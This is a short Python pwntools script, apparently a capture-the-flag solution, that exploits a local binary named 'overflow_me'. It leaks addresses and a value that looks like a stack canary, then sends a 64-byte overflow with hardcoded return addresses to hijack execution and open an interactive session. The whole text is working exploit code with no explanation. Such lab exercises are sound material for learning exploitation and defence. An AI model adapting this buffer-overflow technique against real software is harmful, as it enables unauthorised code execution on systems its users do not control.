from pwn import *

p = process('overflow_me')
p.sendafter(b"address", p64(0x4040b8))
p.recvline()
p.send(p64(int(p.recvline().strip().decode(), 16)))
p.recvline()
p.recvline()
p.recvline()
p.sendline(b'A'*64 + p64(int(p.recvline().split(b'0x')[1].strip().decode(), 16)) + b'B'*8 + p64(0x401331) + p64(0x401331) + p64(0x401424))
p.interactive()
